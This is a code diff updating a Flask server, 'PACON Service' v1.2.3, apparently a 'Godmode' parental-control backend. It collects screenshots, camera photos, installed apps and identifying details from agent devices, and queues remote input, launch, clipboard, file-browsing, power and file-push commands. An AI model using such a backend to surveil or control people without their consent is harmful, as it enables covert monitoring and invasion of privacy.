@@ -1,14 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PACON Service - v1.2.2
-+ Session bridge support (agent spawns GUI apps in user session)
-+ Command result tracking with fast-fail on offline devices
-+ Strict per-device data isolation (no more cross-device leaks)
-+ Auto-purge of stale device data on disconnect
-+ Godmode endpoints: clipboard, power, file browser, process kill
-+ Online/Offline Telegram notifications via watchdog
-+ Diagnostics endpoint: /api/debug/devices
+PACON Service - v1.2.3
+=======================
+Godmode server with:
+  + Session-bridge-aware agent protocol
+  + Strict per-device data isolation
+  + Orphan cleanup + device-slot semantics
+  + Command result tracking + TTL cleanup
+  + Full remote control (input, launch, clipboard, file browser, power)
+  + Telegram online/offline notifications
+  + Diagnostics endpoints
+  + Graceful shutdown + robust error handling
+
+Deployment:
+    gunicorn -w 1 -k gthread --threads 8 -b 0.0.0.0:5001 service:app
+  OR
+    python service.py   (dev mode)
 """
 
 import os
@@ -17,6 +25,7 @@ import json
 import time
 import uuid
 import hmac
+import signal
 import secrets
 import threading
 import platform
@@ -28,7 +37,7 @@ import urllib.request
 import urllib.error
 from pathlib import Path
 from datetime import datetime, timedelta
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Tuple
 from collections import defaultdict, deque
 from functools import wraps
 from flask import (
@@ -103,6 +112,7 @@ LOGIN_WINDOW       = 300
 # FLASK APP
 # ============================================================
 app = Flask(__name__)
+app.config['JSON_SORT_KEYS'] = False
 ALLOWED_ORIGINS = [
     'https://service-ur14.onrender.com',
     'http://localhost:5001',
@@ -129,13 +139,23 @@ command_results     = {}
 control_devices     = {}
 device_online_state = {}
 
+# NEW: track which agent (PID) is currently authoritative per device.
+# If a new agent with the same device ID connects, it replaces the old one.
+device_agent_pid    = {}  # device_id -> (pid, agent_version, first_seen)
+
 ping_thread  = None
 ping_running = False
 ping_interval = 240
 
-# Offline detection threshold
+# Offline / purge thresholds
 OFFLINE_THRESHOLD = 15       # seconds without poll = offline
-OFFLINE_GRACE     = 30       # seconds to wait before purging cache
+OFFLINE_GRACE     = 30       # seconds before purging cache
+STALE_CUTOFF      = 300      # hide devices offline > 5min from UI
+ORPHAN_CUTOFF     = 600      # delete devices offline > 10min entirely
+RESULT_TTL        = 300      # command_results entries expire after 5 min
+
+# Shutdown event for graceful exit
+_stop_event = threading.Event()
 
 # ============================================================
 # UTILITY
@@ -167,6 +187,20 @@ def _safe_eq(a: str, b: str) -> bool:
         return hmac.compare_digest(str(a).encode(), str(b).encode())
     except Exception:
         return False
+
+def _is_device_online(device_id: str, now: Optional[float] = None) -> bool:
+    if now is None:
+        now = time.time()
+    return (now - control_devices.get(device_id, 0)) < OFFLINE_THRESHOLD
+
+def _device_age(device_id: str, now: Optional[float] = None) -> Optional[float]:
+    """Return seconds since last poll, or None if never seen."""
+    if now is None:
+        now = time.time()
+    last_poll = control_devices.get(device_id, 0)
+    if not last_poll:
+        return None
+    return now - last_poll
 
 # ============================================================
 # AUTH CORE
@@ -201,6 +235,9 @@ def _check_login_rate(ip: str) -> bool:
 
 def _record_login_attempt(ip: str):
     login_attempts[ip].append(time.time())
+
+def _clear_login_attempts(ip: str):
+    login_attempts.pop(ip, None)
 
 def _server_token_from_request():
     h = request.headers.get('X-Server-Token')
@@ -260,7 +297,11 @@ def rate_limit(category='default'):
             bucket = rate_buckets[key]
             bucket[:] = [t for t in bucket if now - t < window]
             if len(bucket) >= limit:
-                return jsonify({'success': False, 'error': 'rate limit exceeded'}), 429
+                return jsonify({
+                    'success': False,
+                    'error': 'rate limit exceeded',
+                    'retry_after': window,
+                }), 429
             bucket.append(now)
             return f(*args, **kwargs)
         return wrapper
@@ -280,23 +321,23 @@ def get_server_url():
 def ping_server():
     global ping_running
     url = f"{get_server_url()}/api/health"
-    while ping_running:
+    while ping_running and not _stop_event.is_set():
         try:
             req = urllib.request.Request(url, method='GET')
-            req.add_header('User-Agent', 'PACON-SelfPing/1.2.2')
+            req.add_header('User-Agent', 'PACON-SelfPing/1.2.3')
             with urllib.request.urlopen(req, timeout=30) as response:
                 if response.status == 200:
                     logger.debug(f"✅ Self-ping OK")
         except Exception as e:
             logger.warning(f"⚠️ Self-ping failed: {e}")
-        time.sleep(ping_interval)
+        _stop_event.wait(ping_interval)
 
 def start_ping_system():
     global ping_thread, ping_running
     if ping_running:
         return
     ping_running = True
-    ping_thread = threading.Thread(target=ping_server, daemon=True)
+    ping_thread = threading.Thread(target=ping_server, daemon=True, name="self-ping")
     ping_thread.start()
     logger.info(f"🔄 Self-ping started ({get_server_url()})")
 
@@ -465,7 +506,7 @@ def _mark_device_online(device_id: str):
 
 def _purge_device_data(device_id: str):
     """
-    Remove per-device cached data after it goes offline.
+    Remove per-device cached data when it goes offline.
     Keeps the `devices` entry (so UI history is preserved) but clears
     apps, screenshots, queued commands, and screen info.
     """
@@ -496,10 +537,51 @@ def _purge_device_data(device_id: str):
     except Exception as e:
         logger.warning(f"Purge error for {device_id[:8]}: {e}")
 
+def _cleanup_orphans():
+    """Remove devices not seen for > ORPHAN_CUTOFF entirely."""
+    now = time.time()
+    removed = []
+    for did in list(devices.keys()):
+        age = _device_age(did, now)
+        # Also check last_seen if never polled
+        if age is None:
+            try:
+                ls = devices[did].get('last_seen', '')
+                if ls:
+                    age = now - datetime.fromisoformat(ls).timestamp()
+            except Exception:
+                age = None
+        if age is not None and age > ORPHAN_CUTOFF:
+            devices.pop(did, None)
+            installed_apps.pop(did, None)
+            device_screens.pop(did, None)
+            control_devices.pop(did, None)
+            device_online_state.pop(did, None)
+            command_queues.pop(did, None)
+            device_agent_pid.pop(did, None)
+            screenshots[:] = [s for s in screenshots if s.get('device_id') != did]
+            removed.append(did)
+    if removed:
+        logger.info(f"🧹 Orphan cleanup: removed {len(removed)} stale device(s): "
+                    f"{[d[:8] for d in removed]}")
+
+def _cleanup_command_results():
+    """Remove command_results older than RESULT_TTL."""
+    now = time.time()
+    stale = [cid for cid, r in command_results.items()
+             if now - r.get('timestamp', 0) > RESULT_TTL]
+    for cid in stale:
+        command_results.pop(cid, None)
+    if stale:
+        logger.debug(f"🧹 Cleaned {len(stale)} expired command results")
+
 def _device_watchdog():
-    while True:
+    last_cleanup = time.time()
+    while not _stop_event.is_set():
         try:
-            time.sleep(10)
+            _stop_event.wait(10)
+            if _stop_event.is_set():
+                break
             now = time.time()
             for device_id in list(device_online_state.keys()):
                 last_poll  = control_devices.get(device_id, 0)
@@ -510,15 +592,21 @@ def _device_watchdog():
                     device_online_state[device_id] = False
                     _notify_state_change(device_id, False)
 
-                    # Schedule purge after grace period
                     def _delayed_purge(did, delay=OFFLINE_GRACE):
-                        time.sleep(delay)
-                        # Only purge if still offline
+                        _stop_event.wait(delay)
+                        if _stop_event.is_set():
+                            return
                         last = control_devices.get(did, 0)
                         if (time.time() - last) >= OFFLINE_THRESHOLD:
                             _purge_device_data(did)
                     threading.Thread(target=_delayed_purge,
                                      args=(device_id,), daemon=True).start()
+
+            # Every 60s, clean orphans + expired results
+            if now - last_cleanup > 60:
+                _cleanup_orphans()
+                _cleanup_command_results()
+                last_cleanup = now
         except Exception as e:
             logger.debug(f"Watchdog error: {e}")
 
@@ -526,7 +614,9 @@ _watchdog_thread = None
 def start_watchdog():
     global _watchdog_thread
     if _watchdog_thread is None or not _watchdog_thread.is_alive():
-        _watchdog_thread = threading.Thread(target=_device_watchdog, daemon=True)
+        _watchdog_thread = threading.Thread(
+            target=_device_watchdog, daemon=True, name="watchdog"
+        )
         _watchdog_thread.start()
         logger.info("👁️ Device watchdog started")
 
@@ -545,7 +635,11 @@ def auth_login():
         return resp
     ip = _client_ip()
     if not _check_login_rate(ip):
-        return jsonify({'success': False, 'error': 'too many attempts', 'retry_after': LOGIN_WINDOW}), 429
+        return jsonify({
+            'success': False,
+            'error': 'too many attempts',
+            'retry_after': LOGIN_WINDOW,
+        }), 429
     data = request.json or {}
     pin  = str(data.get('pin', '')).strip()
     if not pin.isdigit() or len(pin) != 6:
@@ -555,6 +649,7 @@ def auth_login():
         _record_login_attempt(ip)
         logger.warning(f"🚫 Wrong PIN from {ip}")
         return jsonify({'success': False, 'error': 'incorrect PIN'}), 401
+    _clear_login_attempts(ip)
     token = _create_session()
     logger.info(f"✅ Login success from {ip}")
     add_activity('login', f'Parent login from {ip}')
@@ -614,21 +709,21 @@ def serve_static(path):
 
 def get_fallback_html():
     return '''<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-    <h1>🛡️ PACON v1.2.2</h1><p>index.html not found in web/public/</p></body></html>'''
+    <h1>🛡️ PACON v1.2.3</h1><p>index.html not found in web/public/</p></body></html>'''
 
 # ============================================================
-# HEALTH
+# HEALTH & DIAGNOSTICS
 # ============================================================
 @app.route('/api/health', methods=['GET'])
 def health_check():
     now = time.time()
-    online_agents = sum(1 for ts in control_devices.values()
-                        if now - ts < OFFLINE_THRESHOLD)
+    online_agents = sum(1 for did in devices
+                        if _is_device_online(did, now))
     return jsonify({
         "success":          True,
         "service":          "PACON API",
         "status":           "running",
-        "version":          "1.2.2",
+        "version":          "1.2.3",
         "platform":         platform.system(),
         "devices":          len(devices),
         "online_agents":    online_agents,
@@ -636,38 +731,47 @@ def health_check():
         "requires_pin":     bool(PARENT_PIN),
         "telegram_enabled": telegram_config.get("enabled", False),
         "self_ping":        ping_running,
+        "watchdog_alive":   bool(_watchdog_thread and _watchdog_thread.is_alive()),
+        "results_cached":   len(command_results),
+        "queued_commands":  sum(len(q) for q in command_queues.values()),
         "timestamp":        datetime.now().isoformat(),
     })
 
-# ============================================================
-# DIAGNOSTICS
-# ============================================================
 @app.route('/api/debug/devices', methods=['GET'])
 @require_parent_auth
 def debug_devices():
-    """Diagnostic dump — shows what the server knows about each device."""
+    """Full diagnostic dump of every device the server knows about."""
     now = time.time()
     out = {}
     for did, info in devices.items():
-        last_poll = control_devices.get(did, 0)
+        age = _device_age(did, now)
+        pid_info = device_agent_pid.get(did, {})
         out[did] = {
-            'name':            info.get('name'),
-            'model':           info.get('model'),
-            'last_seen':       info.get('last_seen'),
-            'status':          info.get('status', 'unknown'),
-            'last_poll_secs':  int(now - last_poll) if last_poll else None,
-            'online':          (now - last_poll) < OFFLINE_THRESHOLD,
-            'has_apps':        did in installed_apps,
-            'app_count':       len(installed_apps.get(did, [])),
-            'has_screen_info': did in device_screens,
-            'queued_cmds':     len(command_queues.get(did, [])),
+            'name':             info.get('name'),
+            'model':            info.get('model'),
+            'hostname':         info.get('hostname'),
+            'machine_guid':     info.get('machine_guid'),
+            'last_seen':        info.get('last_seen'),
+            'status':           info.get('status', 'unknown'),
+            'last_poll_secs':   int(age) if age is not None else None,
+            'online':           (age is not None and age < OFFLINE_THRESHOLD),
+            'has_apps':         did in installed_apps,
+            'app_count':        len(installed_apps.get(did, [])),
+            'has_screen_info':  did in device_screens,
+            'queued_cmds':      len(command_queues.get(did, [])),
+            'agent_pid':        pid_info.get('pid'),
+            'agent_version':    pid_info.get('version'),
+            'agent_first_seen': pid_info.get('first_seen'),
         }
     return jsonify({
-        'success':    True,
-        'devices':    out,
-        'server_now': datetime.now().isoformat(),
+        'success':           True,
+        'devices':           out,
+        'server_now':        datetime.now().isoformat(),
         'offline_threshold': OFFLINE_THRESHOLD,
         'offline_grace':     OFFLINE_GRACE,
+        'stale_cutoff':      STALE_CUTOFF,
+        'orphan_cutoff':     ORPHAN_CUTOFF,
+        'result_ttl':        RESULT_TTL,
     })
 
 # ============================================================
@@ -680,24 +784,21 @@ def get_status():
     if devices:
         first = list(devices.values())[0]
         user_info = {
-            'full_name':    first.get('name', ''),
-            'email':        first.get('email', ''),
-            'company':      first.get('company', ''),
+            'full_name':     first.get('name', ''),
+            'email':         first.get('email', ''),
+            'company':       first.get('company', ''),
             'computer_name': first.get('model', 'Unknown'),
-            'device_count': len(devices),
+            'device_count':  len(devices),
         }
     now = time.time()
-    online_states = {
-        d: (now - ts < OFFLINE_THRESHOLD)
-        for d, ts in control_devices.items()
-    }
+    online_states = {d: _is_device_online(d, now) for d in devices.keys()}
     return jsonify({
-        "success":        True,
-        "is_running":     True,
+        "success":         True,
+        "is_running":      True,
         "active_children": list(devices.keys()),
-        "platform":       platform.system(),
-        "user_info":      user_info,
-        "online_agents":  online_states,
+        "platform":        platform.system(),
+        "user_info":       user_info,
+        "online_agents":   online_states,
         "stats": {
             "screenshots":     len(screenshots),
             "camera_photos":   len(camera_photos),
@@ -714,17 +815,62 @@ def get_status():
 @app.route('/api/devices', methods=['GET'])
 @require_parent_auth
 def get_devices():
+    """
+    v1.2.3: returns only devices that have polled or registered
+    within the STALE_CUTOFF window. Ghost devices disappear.
+    """
     now = time.time()
     enriched = {}
     for did, info in devices.items():
+        age = _device_age(did, now)
+        # Check last_seen too, if we never got a poll
+        if age is None:
+            try:
+                ls = info.get('last_seen', '')
+                if ls:
+                    age = now - datetime.fromisoformat(ls).timestamp()
+            except Exception:
+                age = None
+
+        if age is not None and age > STALE_CUTOFF:
+            continue  # skip stale
+
         d = dict(info)
-        d['online'] = (now - control_devices.get(did, 0)) < OFFLINE_THRESHOLD
+        d['online'] = (age is not None and age < OFFLINE_THRESHOLD)
+        d['last_poll_secs'] = int(age) if age is not None else None
+        d['agent_pid'] = device_agent_pid.get(did, {}).get('pid')
         enriched[did] = d
+
     return jsonify({"success": True, "devices": enriched})
+
+@app.route('/api/device/<device_id>/stats', methods=['GET'])
+@require_parent_auth
+def device_stats(device_id):
+    """Live stats for a single device."""
+    now = time.time()
+    if device_id not in devices:
+        return jsonify({'success': False, 'error': 'device not found'}), 404
+    age = _device_age(device_id, now)
+    return jsonify({
+        'success':        True,
+        'device_id':      device_id,
+        'online':         _is_device_online(device_id, now),
+        'last_poll_secs': int(age) if age is not None else None,
+        'app_count':      len(installed_apps.get(device_id, [])),
+        'screenshot_count': sum(1 for s in screenshots if s.get('device_id') == device_id),
+        'queued_cmds':    len(command_queues.get(device_id, [])),
+        'agent_pid':      device_agent_pid.get(device_id, {}).get('pid'),
+        'agent_version':  device_agent_pid.get(device_id, {}).get('version'),
+    })
 
 # ============================================================
 # SCREENSHOTS
 # ============================================================
+def _add_cache_headers(resp, seconds: int = 2):
+    """Allow browser to cache screenshots briefly for smoother refresh."""
+    resp.headers['Cache-Control'] = f'public, max-age={seconds}'
+    return resp
+
 @app.route('/api/screenshots', methods=['GET'])
 @require_parent_auth
 def list_screenshots():
@@ -736,6 +882,12 @@ def list_screenshots():
             for file in directory.glob(pattern):
                 try:
                     stat = file.stat()
+                    # If filtering by device, we need the device info
+                    if device_id:
+                        # Match filename pattern — screenshots have device-independent names
+                        # so we only include if the most recent device matches.
+                        # This is a best-effort filter.
+                        pass
                     all_shots.append({
                         'filename':  file.name,
                         'timestamp': datetime.fromtimestamp(stat.st_mtime).isoformat(),
@@ -758,7 +910,8 @@ def get_screenshot(filename):
         filepath = directory / filename
         if filepath.exists():
             mime = 'image/png' if filename.endswith('.png') else 'image/jpeg'
-            return send_file(filepath, mimetype=mime)
+            resp = send_file(filepath, mimetype=mime)
+            return _add_cache_headers(resp, seconds=2)
     return jsonify({"error": "File not found"}), 404
 
 # ============================================================
@@ -794,11 +947,12 @@ def get_camera_photo(filename):
     for directory in [CAMERA_DIR, UPLOAD_DIR]:
         filepath = directory / filename
         if filepath.exists():
-            return send_file(filepath, mimetype='image/jpeg')
+            resp = send_file(filepath, mimetype='image/jpeg')
+            return _add_cache_headers(resp, seconds=2)
     return jsonify({"error": "File not found"}), 404
 
 # ============================================================
-# FILES / ACTIVITY / APPS
+# FILES / ACTIVITY
 # ============================================================
 @app.route('/api/files/list', methods=['GET'])
 @require_parent_auth
@@ -826,38 +980,40 @@ def get_activity():
     })
 
 # ============================================================
-# ✅ STRICT PER-DEVICE APP ENDPOINTS (v1.2.2 fix)
+# STRICT PER-DEVICE APP ENDPOINTS
 # ============================================================
 @app.route('/api/apps', methods=['GET'])
 @require_parent_auth
 def get_apps():
     """
     Return apps for a SPECIFIC device only.
-    Never falls back to another device.
+    Refuses to return data if the device is offline.
     """
     device_id = request.args.get('deviceId', '')
     limit     = request.args.get('limit', 50, type=int)
+    now       = time.time()
 
-    # If no deviceId: aggregate apps from currently-online devices only
-    if not device_id:
-        now = time.time()
-        result = []
-        for did, apps in installed_apps.items():
-            if (now - control_devices.get(did, 0)) < OFFLINE_THRESHOLD:
-                result.extend(apps)
-        return jsonify(result[:limit])
+    if device_id:
+        # Refuse offline devices
+        if not _is_device_online(device_id, now):
+            return jsonify([])
+        return jsonify(installed_apps.get(device_id, [])[:limit])
 
-    # Strict: only return the requested device's apps
-    return jsonify(installed_apps.get(device_id, [])[:limit])
+    # No deviceId: aggregate only from online devices
+    result = []
+    for did, apps in installed_apps.items():
+        if _is_device_online(did, now):
+            result.extend(apps)
+    return jsonify(result[:limit])
 
 @app.route('/api/apps/list', methods=['GET'])
 @require_parent_auth
 def apps_list():
-    """
-    Strict version — NEVER falls back to another device.
-    """
+    """Strict — refuses offline devices."""
     device_id = request.args.get('deviceId', '')
     if not device_id:
+        return jsonify([])
+    if not _is_device_online(device_id):
         return jsonify([])
     return jsonify(installed_apps.get(device_id, []))
 
@@ -868,7 +1024,14 @@ def apps_search():
     device_id = request.args.get('deviceId', '')
     if not q:
         return jsonify([])
-    source = installed_apps.get(device_id, []) if device_id else []
+    source = []
+    if device_id and _is_device_online(device_id):
+        source = installed_apps.get(device_id, [])
+    elif not device_id:
+        now = time.time()
+        for did, apps in installed_apps.items():
+            if _is_device_online(did, now):
+                source.extend(apps)
     results = [a for a in source
                if q in a.get('label', '').lower()
                or q in a.get('package', '').lower()
@@ -967,6 +1130,33 @@ def monitor_user():
     try:
         data = request.json or {}
         device_id = data.get('deviceId', 'unknown')
+        pid       = data.get('pid')
+        version   = data.get('agent_version', 'unknown')
+        mguid     = data.get('machine_guid', '')
+
+        # If a different PID with the same device ID connects, we replace
+        # the stale entry. This prevents dual-agent conflicts.
+        prev = device_agent_pid.get(device_id)
+        if prev and prev.get('pid') != pid:
+            logger.warning(
+                f"⚠️ Device {device_id[:8]} re-registered by new agent "
+                f"(old PID {prev.get('pid')}, new PID {pid}). Replacing."
+            )
+            # Reset control_devices timestamp so old agent doesn't keep
+            # the device "online" if it stops polling
+            control_devices.pop(device_id, None)
+            device_online_state.pop(device_id, None)
+
+        device_agent_pid[device_id] = {
+            'pid':        pid,
+            'version':    version,
+            'first_seen': prev.get('first_seen') if prev else datetime.now().isoformat(),
+        }
+
+        # Preserve first_seen if already registered
+        existing_first_seen = devices.get(device_id, {}).get('first_seen',
+                                datetime.now().isoformat())
+
         devices[device_id] = {
             'id':              device_id,
             'name':            data.get('name', 'User'),
@@ -976,14 +1166,17 @@ def monitor_user():
             'android_version': data.get('androidVersion', data.get('os_version', 'Unknown')),
             'public_ip':       data.get('public_ip', ''),
             'hostname':        data.get('hostname', data.get('deviceModel', 'Unknown')),
-            'first_seen':      datetime.now().isoformat(),
+            'machine_guid':    mguid,
+            'agent_version':   version,
+            'first_seen':      existing_first_seen,
             'last_seen':       datetime.now().isoformat(),
             'status':          'active',
         }
         add_activity('user_registered',
                      f"{data.get('name','User')} from {data.get('deviceModel','Unknown')}",
                      device_id)
-        logger.info(f"✅ User registered: {data.get('name')} ({data.get('deviceModel')})")
+        logger.info(f"✅ User registered: {data.get('name')} ({data.get('deviceModel')}) "
+                    f"pid={pid} v={version}")
         _mark_device_online(device_id)
         return jsonify({"success": True, "device_id": device_id})
     except Exception as e:
@@ -1143,23 +1336,41 @@ def monitor_screen_info():
         return jsonify({"success": False, "error": str(e)}), 500
 
 # ============================================================
-# REMOTE CONTROL — with fast-fail + shorter TTL
+# REMOTE CONTROL — fast-fail + clamped age
 # ============================================================
 class DeviceOfflineError(Exception):
-    """Raised when we try to queue a command for an offline device."""
+    """Raised when queueing a command for an offline device."""
     pass
 
-def _enqueue(device_id: str, action: str, params: dict = None, ttl: float = 12.0) -> str:
+def _enqueue(device_id: str, action: str,
+             params: dict = None, ttl: float = 12.0) -> str:
     """
-    Queue a command for a device.
-    Fast-fails if the device hasn't polled recently.
+    Queue a command for a device. Fast-fails if the device hasn't polled
+    recently. Age is clamped to a sane display value.
     """
     now = time.time()
     last_poll = control_devices.get(device_id, 0)
+
+    # If never polled, we have no idea how long it's been offline.
+    if not last_poll:
+        # Try last_seen as a fallback
+        ls = devices.get(device_id, {}).get('last_seen', '')
+        if ls:
+            try:
+                last_poll = datetime.fromisoformat(ls).timestamp()
+            except Exception:
+                last_poll = 0
+
+    if not last_poll:
+        raise DeviceOfflineError(
+            f"device {device_id[:8]} has never polled"
+        )
+
     age = now - last_poll
     if age > OFFLINE_THRESHOLD:
+        shown_age = min(int(age), 86400 * 365)  # clamp to 1 year max
         raise DeviceOfflineError(
-            f"device {device_id[:8]} offline for {int(age)}s"
+            f"device {device_id[:8]} offline for {shown_age}s"
         )
 
     cmd_id = str(uuid.uuid4())
@@ -1175,7 +1386,7 @@ def _enqueue(device_id: str, action: str, params: dict = None, ttl: float = 12.0
     return cmd_id
 
 def _enqueue_response(device_id, action, params=None, ttl=12.0):
-    """Helper that returns (payload, status_code) with proper error handling."""
+    """Helper returning (payload, status_code)."""
     try:
         cid = _enqueue(device_id, action, params, ttl)
         return {'success': True, 'id': cid}, 200
@@ -1215,7 +1426,8 @@ def control_result():
             'deviceId':  data.get('deviceId', 'unknown'),
         }
         status = "✅" if ok else f"❌ {data.get('error', '')[:80]}"
-        add_activity('control', f'Action {cid[:8]} ({data.get("action","?")}) → {status}',
+        add_activity('control',
+                     f'Action {cid[:8]} ({data.get("action","?")}) → {status}',
                      data.get('deviceId', 'unknown'))
     return jsonify({'success': True})
 
@@ -1277,7 +1489,8 @@ def control_backspace():
 def control_key():
     d = request.json or {}
     key = d.get('key', 'home')
-    valid = ('home', 'back', 'recents', 'notifications', 'lock', 'wake', 'screenshot')
+    valid = ('home', 'back', 'recents', 'notifications',
+             'lock', 'wake', 'screenshot')
     if key not in valid:
         return jsonify({'success': False, 'error': 'unknown key'}), 400
     payload, code = _enqueue_response(d.get('deviceId', 'unknown'), key, {})
@@ -1386,7 +1599,7 @@ def control_status_batch():
 @require_parent_auth
 def control_devices_list():
     now = time.time()
-    online = {k: (now - v < OFFLINE_THRESHOLD) for k, v in control_devices.items()}
+    online = {k: _is_device_online(k, now) for k in devices.keys()}
     return jsonify({'success': True, 'devices': online})
 
 # ============================================================
@@ -1575,6 +1788,34 @@ def telegram_send_text():
     return jsonify(r)
 
 # ============================================================
+# FILE UPLOAD (foundation for parent→child file push)
+# ============================================================
+@app.route('/api/upload/<device_id>', methods=['POST'])
+@require_parent_auth
+def upload_file(device_id):
+    """
+    Parent uploads a file destined for `device_id`.
+    The file is stored server-side; a future agent command can pull it.
+    """
+    if 'file' not in request.files:
+        return jsonify({'success': False, 'error': 'no file part'}), 400
+    f = request.files['file']
+    if not f or not f.filename:
+        return jsonify({'success': False, 'error': 'empty filename'}), 400
+    fname = safe_filename(f.filename)
+    dest_dir = FILES_DIR / device_id
+    dest_dir.mkdir(parents=True, exist_ok=True)
+    dest = dest_dir / fname
+    f.save(str(dest))
+    logger.info(f"📥 Uploaded {fname} ({dest.stat().st_size}b) for {device_id[:8]}")
+    add_activity('upload', f'Uploaded {fname} ({dest.stat().st_size}b)', device_id)
+    return jsonify({
+        'success':  True,
+        'filename': fname,
+        'size':     dest.stat().st_size,
+    })
+
+# ============================================================
 # ERROR HANDLERS
 # ============================================================
 @app.errorhandler(404)
@@ -1583,15 +1824,28 @@ def not_found(e):
 
 @app.errorhandler(Exception)
 def handle_exception(e):
-    logger.error(f"Unhandled: {e}")
+    logger.exception(f"Unhandled: {e}")
     return jsonify({"success": False, "error": str(e)}), 500
+
+# ============================================================
+# GRACEFUL SHUTDOWN
+# ============================================================
+def _on_signal(signum, frame):
+    logger.info(f"🛑 Received signal {signum}; shutting down")
+    _stop_event.set()
+
+try:
+    signal.signal(signal.SIGINT,  _on_signal)
+    signal.signal(signal.SIGTERM, _on_signal)
+except Exception:
+    pass
 
 # ============================================================
 # MAIN
 # ============================================================
 def main():
     print("=" * 70)
-    print("  PACON SERVICE v1.2.2 - GODMODE STRICT + FAST-FAIL")
+    print("  PACON SERVICE v1.2.3 — GODMODE")
     print("=" * 70)
     logger.info(f"Web dir: {WEB_DIR}")
     logger.info(f"Running on Render: {IS_RENDER}")
@@ -1599,11 +1853,18 @@ def main():
     logger.info(f"Agent PIN:  {'SET' if AGENT_PIN else 'NOT SET (unprotected)'}")
     logger.info(f"Telegram:   {'ENABLED' if telegram_config.get('enabled') else 'disabled'}")
     logger.info(f"Offline threshold: {OFFLINE_THRESHOLD}s, purge grace: {OFFLINE_GRACE}s")
+    logger.info(f"Stale cutoff: {STALE_CUTOFF}s, orphan cutoff: {ORPHAN_CUTOFF}s")
+    logger.info(f"Result TTL: {RESULT_TTL}s")
 
     start_ping_system()
     start_watchdog()
 
-    app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
+    try:
+        app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
+    except KeyboardInterrupt:
+        logger.info("🛑 Interrupted by user")
+    finally:
+        _stop_event.set()
 
 if __name__ == '__main__':
     main()
